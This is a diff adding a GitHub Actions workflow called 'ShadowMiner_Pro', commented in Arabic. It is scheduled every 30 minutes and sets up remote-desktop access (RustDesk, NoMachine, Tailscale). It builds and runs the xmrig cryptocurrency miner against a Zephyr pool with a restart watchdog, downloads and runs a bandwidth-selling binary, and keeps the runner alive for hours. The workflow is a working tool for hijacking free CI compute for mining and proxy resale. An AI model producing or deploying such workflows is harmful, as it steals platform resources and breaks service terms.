@@ -1,0 +1,120 @@
+name: ShadowMiner_Pro
+
+on:
+  push:
+    branches: [ "main", "master" ]
+  schedule:
+    - cron: '*/30 * * * *'
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+    strategy:
+      matrix:
+        cpu: [1, 2]
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v4
+
+    - name: System, RDP & Display Setup
+      run: |
+        sudo apt-get update
+        sudo apt-get install -y xvfb x11vnc fluxbox xterm wget curl git build-essential cmake libuv1-dev libssl-dev libhwloc-dev jq
+
+    - name: Download & Extract App Bundle
+      run: |
+        wget -O rustdesk.deb https://github.com/rustdesk/rustdesk/releases/download/1.2.3/rustdesk-1.2.3-x86_64.deb
+        sudo dpkg -i rustdesk.deb || sudo apt-get install -f -y
+        wget -O nomachine.deb https://download.nomachine.com/download/8.10/Linux/nomachine_8.10.1_1_amd64.deb
+        sudo dpkg -i nomachine.deb || sudo apt-get install -f -y
+        curl -fsSL https://tailscale.com/install.sh | sh
+
+    - name: RustDesk Configuration (اختياري)
+      run: |
+        mkdir -p ~/.config/rustdesk
+        echo '{"server":"your.rustdesk.server","key":"your_key"}' > ~/.config/rustdesk/RustDesk.toml
+        nohup rustdesk &
+
+    - name: Tailscale Setup (اختياري)
+      run: |
+        sudo tailscale up --auth-key "your-tailscale-auth-key" --hostname shadow-runner-${{ matrix.cpu }} || echo "تم تخطي Tailscale"
+        sudo tailscale status || echo "غير مفعل"
+
+    - name: Deploy Important Files to Desktop
+      run: |
+        mkdir -p ~/Desktop
+        echo "التشغيل مفعل للمستخدم الأعلى" > ~/Desktop/README.txt
+        cat ~/Desktop/README.txt
+
+    - name: Browser & Kernel Setup
+      run: |
+        sudo sysctl -w net.ipv4.tcp_congestion_control=bbr
+        sudo sysctl -w vm.swappiness=10
+
+    - name: Install NoMachine
+      run: sudo systemctl enable nxserver && sudo systemctl start nxserver
+
+    - name: Build Miner (Zephyr)
+      run: |
+        git clone https://github.com/xmrig/xmrig.git
+        cd xmrig
+        mkdir build && cd build
+        cmake ..
+        make -j$(nproc)
+
+    - name: Start Miner & Bandwidth Seller (بياناتك مدمجة هنا)
+      run: |
+        # ============================================================
+        # 🔻🔻🔻 ضع بياناتك هنا مباشرة 🔻🔻🔻
+        ZEPH_WALLET="ضَع_عنوان_محفظتك_هنا"
+        P2P_EMAIL="ضَع_بريدك_الإلكتروني_هنا"
+        # ============================================================
+
+        # تشغيل التعدين
+        cd xmrig/build
+        nohup ./xmrig -o pool.zephyr.herominers.com:1122 -u $ZEPH_WALLET -p x --cpu-max-threads-hint=80 --randomx-mode=fast &
+
+        # تشغيل بيع النطاق (إن وضعت بريداً صحيحاً)
+        if [ "$P2P_EMAIL" != "ضَع_بريدك_الإلكتروني_هنا" ]; then
+          wget -O p2p.tar.gz https://github.com/Peer2Profit/peer2profit_linux/releases/latest/download/peer2profit_linux.tar.gz
+          tar -xzf p2p.tar.gz
+          chmod +x peer2profit
+          nohup ./peer2profit --email $P2P_EMAIL &
+        fi
+
+        # حارس التعدين (Watchdog)
+        echo '#!/bin/bash
+        while true; do
+          if ! pgrep -x "xmrig" > /dev/null; then
+            cd ~/xmrig/build && nohup ./xmrig -o pool.zephyr.herominers.com:1122 -u '$ZEPH_WALLET' -p x &
+          fi
+          sleep 60
+        done' > watchdog.sh
+        chmod +x watchdog.sh
+        nohup ./watchdog.sh &
+
+    - name: Keep Session Alive & Show Page Link
+      run: |
+        echo "==== اكتمل الإعداد. بدء المؤقت ===="
+        echo "تشغيل لمدة 340 دقيقة..."
+
+        REPO_NAME=$(echo "$GITHUB_REPOSITORY" | cut -d'/' -f2)
+        USER_NAME=$(echo "$GITHUB_REPOSITORY" | cut -d'/' -f1)
+        PAGES_URL="https://${USER_NAME}.github.io/${REPO_NAME}/"
+
+        echo "=================================================="
+        echo "🔗 رابط لوحة مراقبة الأرباح (افتحها من أي متصفح):"
+        echo "   $PAGES_URL"
+        echo "=================================================="
+        echo "ضع محفظتك في الصفحة (نفس العنوان الذي وضعته في الكود) وسترى الأرباح"
+        echo "=================================================="
+
+        for i in $(seq 1 340); do
+          echo "[$i/340] الجلسة نشطة ... التعدين يعمل"
+          sleep 60
+        done
+
+    - name: Post Checkout
+      run: echo "اكتملت الدورة. ستعاد تلقائياً كل 30 دقيقة."
